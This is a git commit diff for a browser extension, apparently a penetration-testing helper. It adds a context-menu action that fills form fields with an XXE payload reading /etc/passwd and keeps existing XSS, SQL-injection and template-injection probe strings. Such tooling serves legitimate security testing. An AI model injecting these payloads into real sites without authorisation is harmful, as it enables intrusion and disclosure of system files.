ed30448d9508c781b534739c21e19a8487619fe6
anonyme <remi.assidi@gmail.com>
2021-12-01 10:14:21 +0100

    Add XXE

--- background.js
+++ background.js
@@ -35,36 +35,58 @@ browser.menus.create({
   contexts: ["editable"],
 });
 
+browser.menus.create({
+  id: "xxe-read-file",
+  title: "XXE read file injection",
+  documentUrlPatterns: ["*://*/*"],
+  contexts: ["editable"],
+});
+
 browser.menus.onClicked.addListener((info, tab) => {
-  if (info.menuItemId == "xss-var") {
-    browser.tabs.executeScript(tab.id, {
-      frameId: info.frameId,
-      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
-      elem.value="<img src=1 onerror=alert(\'" + elem.id + "\')>"`,
-    });
-  } else if (info.menuItemId == "xss") {
-    browser.tabs.executeScript(tab.id, {
-      frameId: info.frameId,
-      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
-      elem.value="<img src=1 onerror=alert()>"`,
-    });
-  } else if (info.menuItemId == "simple-sqli") {
-    browser.tabs.executeScript(tab.id, {
-      frameId: info.frameId,
-      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
-      elem.value="' or 1=1;-- "`,
-    });
-  } else if (info.menuItemId == "double-sqli") {
-    browser.tabs.executeScript(tab.id, {
-      frameId: info.frameId,
-      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
-      elem.value='" or 1=1;-- '`,
-    });
-  } else if (info.menuItemId == "template-injection") {
-    browser.tabs.executeScript(tab.id, {
-      frameId: info.frameId,
-      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
-      elem.value='\${7*7}'`,
-    });
+  switch (info.menuItemId) {
+    case "xss-var":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value="<img src=1 onerror=alert(\'" + elem.id + "\')>"`,
+      });
+      break;
+    case "xss":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value="<img src=1 onerror=alert()>"`,
+      });
+      break;
+    case "simple-sqli":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value="' or 1=1;-- "`,
+      });
+      break;
+    case "double-sqli":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value='" or 1=1;-- '`,
+      });
+      break;
+    case "template-injection":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value='\${7*7}'`,
+      });
+      break;
+    case "xxe-read-file":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]><root>&read;</root>'`,
+      });
+      break;
   }
 });
+
+
